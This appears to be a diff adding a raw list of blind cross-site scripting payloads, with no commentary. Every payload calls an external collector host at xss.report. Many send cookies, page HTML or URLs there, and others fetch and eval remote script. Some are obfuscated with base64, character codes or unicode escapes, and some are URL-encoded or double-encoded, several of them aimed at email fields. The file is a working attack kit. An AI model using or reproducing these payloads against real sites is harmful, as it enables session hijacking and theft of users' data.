@@ -1,0 +1,118 @@
+'"><script src=https://xss.report/c/mickey></script>
+'"<svg/onload="window.location.href='https://xss.report/c/mickey'">
+<input autofocus onfocus="fetch('https://xss.report/c/mickey?token='+document.cookie)"//>
+<textarea onfocus="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Focus me</textarea>
+javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/mickey?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
+<img src=x onerror=fetch('https://xss.report/c/mickey?c='+document.cookie)>
+'"<svg/onload="fetch('https://xss.report/c/mickey'">
+'"<svg/onload='var a="fetch";var b="https://xss.report/c/mickey"; setTimeout(a+"(b)",1000)'>
+'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/mickey")></script>
+'"?><svg/onload="fetch('https://xss.report/c/mickey?cookie='+document.cookie)"//>
+'"><Svg Src=//xss.report/c/mickey/s OnLoad=import(this.getAttribute('src')+0)>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL21pY2tleSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
+"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL21pY2tleSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\mickey/.source))//>
+'"><script src=https://xss.report/c/mickey></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/mickey\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/mickey");a.send();</script>
+<script>$.getScript("//xss.report/c/mickey")</script>
+var a=document.createElement("script");a.src="https://xss.report/c/mickey";document.body.appendChild(a);
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=(import(/https:\xss.report\c\mickey/.source))//>
+'"<img src="https://xss.report/c/mickey" onerror='this.src="https://xss.report/c/mickey"'>
+'"<img src=x onerror='this.src="https://xss.report/c/mickey"'>
+'"<img src=x onerror='fetch("https://xss.report/c/mickey",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
+'"<iframe src='javascript:window.location="https://xss.report/c/mickey"'></iframe>
+'"<iframe srcdoc='<script>window.location="https://xss.report/c/mickey"</script>'></iframe>
+'"<iframe srcdoc='<script>fetch("https://xss.report/c/mickey",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"<object data='javascript:window.location="https://xss.report/c/mickey"'></object>
+<input onfocus='fetch("https://xss.report/c/mickey",{method:"POST",mode:"no-cors"})' autofocus>
+'"<script type="text/javascript" src="https://xss.report/c/mickey"></script>
+'"<script type="module" src="https://xss.report/c/mickey"></script>
+'"<script nomodule src="https://xss.report/c/mickey"></script>
+javascript:window.location="https://xss.report/c/mickey"
+javascript:fetch("https://xss.report/c/mickey")
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/mickey"></scrIpt>
+'"<img src="https://xss.report/c/mickey" onerror="this.src='https://xss.report/c/mickey'">
+'"<svg/onload="window.location.href='https://xss.report/c/mickey'">
+'"<audio src onerror='fetch("https://xss.report/c/mickey",{method:"POST",mode:"no-cors"})'>
+'"<script>new Image().src="https://xss.report/c/mickey"</script>
+'"<form action="https://xss.report/c/mickey" method="POST"><input name="data" value=""></form><script>document.forms[0].submit();</script>
+'"<iframe src="javascript:fetch('https://xss.report/c/mickey')"></iframe>
+'"<link rel="stylesheet" href="https://xss.report/c/mickey" onerror='fetch("https://xss.report/c/mickey")'>
+'"<meta http-equiv="refresh" content="0;url=https://xss.report/c/mickey">
+'"<object data="https://xss.report/c/mickey" onerror='this.data="https://xss.report/c/mickey"'></object>
+javascript:fetch("https://xss.report/c/mickey")
+'"<svg/onload="fetch('https://xss.report/c/mickey'">
+{constructor.constructor('fetch("https://xss.report/c/mickey"')()}
+'"<img src=x onerror="fetch('https://xss.report/c/mickey')">
+'"></script></title></textarea><script src=//https://xss.report/c/mickey></script>
+'"<svg/onload='var a="fetch";var b="https://xss.report/c/mickey"; setTimeout(a+"(b)",1000)'>
+'"<iframe src="javascript:setTimeout('fetch(\"https://xss.report/c/mickey\")', 1000)"></iframe>
+'"<form id='xss'><button form='xss' formaction='javascript:fetch("https://xss.report/c/mickey")'>Click Me</button></form>
+'/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/mickey"></scrIpt>
+'"><img src=x onerror=setTimeout(String.fromCharCode(102,101,116,99,104)+'("https://xss.report/c/mickey")', 0)>
+'"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/mickey")></script>
+'"?><svg/onload="fetch('https://xss.report/c/mickey?cookie='+document.cookie)"//>
+<img src=x onerror="setTimeout(function(){fetch('https://xss.report/c/mickey?data='+document.cookie)},10)"//>
+<input autofocus onfocus="fetch('https://xss.report/c/mickey?token='+document.cookie)"//>
+<iframe src="javascript:void(0)" onload="fetch('https://xss.report/c/mickey?url='+location.href)"//><!--" -->
+</noscript><script src=https://xss.report/c/mickey></script>
+ibrahim'"<script src=https://xss.report/c/mickey></script>
+mickey%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fmickey%3E%3C%2Fscript%3E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src=https://xss.report/c/mickey></scrIpt>
+/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://xss.report/c/mickey"></scrIpt>
+-'"><Svg Src=//xss.report/c/mickey/s OnLoad=import(this.getAttribute('src')+0)>
+email%5D=zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fmickey%22%3E%3C%2Fscript%3E%40mickey1337%40gmail.com
+<input onmouseover="fetch('https://xss.report/c/mickey?cookie='+document.cookie)">
+'"><Svg Src=//xss.report/c/mickey/s OnLoad=import(this.getAttribute('src')+0)>
+'"><Img Src=//xss.report/c/mickey/x Onload=import(src+0)>
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:https://xss.report/c/mickey\00?1=1290/.source))//>
+\"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location='https://xss.report/c/mickey?c='+Reflect.get(document,'coo'+'kie')">
+\"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss.report/c/mickey'">
+<p><img src="https://xss.report/c/mickey" border="0" />--&gt;</p>
+'"></title></textarea></script></style></noscript><script src=https://xss.report/c/mickey></script>
+‘;"/></textarea></script><script src=//xss.report/c/mickey>
+zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fmickey%22%3E%3C%2Fscript%3E%40mickey1337%40gmail.com
+zer0_sec 1"><script src="https://xss.report/c/mickey"></script>@mickey1337@gmail.com
+mickey1337@gmail.com"><script src="https://xss.report/c/mickey"></script>
+mickey1337@gmail.com"><script src="https://xss.report/c/mickey"></script>
+{globalThis.constructor("fetch('https://xss.report/c/mickey?cookie='+document.cookie)")()}
+mickey1337@gmail.com<!--" --><script src=https://xss.report/c/mickey></script>
+mickey1337@gmail.com"><script src="https://xss.report/c/mickey"></script>
+mickey1337@gmail.com"><svg onload="fetch('https://xss.report/c/mickey?cookie='+document.cookie)"></svg>
+<iframe src="https://xss.report" onload="fetch('https://xss.report/c/mickey?cookie=' + document.cookie)"></iframe>
+</script><Iframe SrcDoc="><script src=https://xss.report/c/mickey></script>">
+%3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fmickey%3E%3C%2Fscript%3E%22%3E
+%253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fxss.report%252Fc%252Fmickey%253E%253C%252Fscript%253E%2522%253E
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss.report/c/mickey"></scrIpt>
+--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%22%2F%2F%27%2F%2F%3E%3Cscript%20src%3D%22https%3A%2F%2Fxss.report%2Fc%2Fmickey%22%3E%3C%2Fscript%3E
+--%253E%253C%252Ftitle%253E%253C%252Fstyle%253E%253C%252Ftextarea%253E%253C%252Fscript%253E%2522%252F%252F%2527%252F%252F%253E%253Cscript%2520src%253D%2522https%253A%252F%252Fxss.report%252Fc%252Fmickey%2522%253E%253C%252Fscript%253E
+%2F%2F%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fmickey%3E%3C%2Fscript%3E
+'"><script src=https://xss.report/c/mickey></script>
+<img src=x onerror=fetch('https://xss.report/c/mickey?c='+document.cookie)>
+javascript://%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss.report%2Fc%2Fmickey%3E%3C%2Fscript%3E
+javascript://%27%22%3E%3Csvg%20onmouseover%3D%22fetch('https://xss.report/c/mickey?data='+document.cookie)%22%3E%3C%2Fsvg%3E
+javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss.report/c/mickey?cookie='+document.cookie)//>
+javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss.report/c/mickey?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
+'//><scrIpt src=//xss.report/c/mickey></scrIpt>
+<a href="javascript:fetch('https://xss.report/c/mickey').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="#" onclick="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Click me</a>
+<input onblur="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">
+<div ondblclick="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Double-click me</div>
+<div oncontextmenu="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Right-click me</div>
+<div onmouseover="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Hover over me</div>
+<div onmousedown="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Press me</div>
+<div onmouseup="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Release me</div>
+<div onwheel="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Scroll on me</div>
+<a onclick="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Click</a>
+<a href="javascript:(new Function('fetch(\'https://xss.report/c/mickey\').then(r=>r.text()).then(t=>{let s=document.createElement(\'script\');s.innerHTML=t;document.body.appendChild(s);})'))()">Click me</a>
+<a href="javascript:let f='fetch',u='https://xss.report/c/mickey',e='eval';window[e](`${f}('${u}').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})`)">Click me</a>
+<a href="javascript:fetch('https://xss.report/c/mickey').then(r=>r.text()).then(t=>{let s=document.createElement('script');s.innerHTML=t;document.body.appendChild(s);})">Click me</a>
+<a href="javascript:eval('\u0066\u0065\u0074\u0063\u0068(\u0027https://xss.report/c/mickey\u0027).then(\u0072=>\u0072.text()).then(\u0074=>{let \u0073=document.createElement(\u0027script\u0027);\u0073.innerHTML=\u0074;document.body.appendChild(\u0073);})')">Click me</a>
+<div onmouseover="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Hover over me</div>
+<a href="javascript:(function(){let s=document.createElement('script');s.src='https://xss.report/c/mickey';document.body.appendChild(s);})()">Click me</a>
+<div onclick="let s=document.createElement('script');s.src='https://xss.report/c/mickey';document.body.appendChild(s);">Click me</div>
+<textarea onfocus="fetch('https://xss.report/c/mickey').then(r=>r.text()).then(eval)">Focus me</textarea>
+<div onclick="let u='https://xss.report/c/'.concat('mickey');fetch(u).then(r=>r.text()).then(eval)">Click me</div>
+"><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;https://xss.report/c/mickey&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
+<="" script=""><script src="//xss.report/c/mickey"></script>
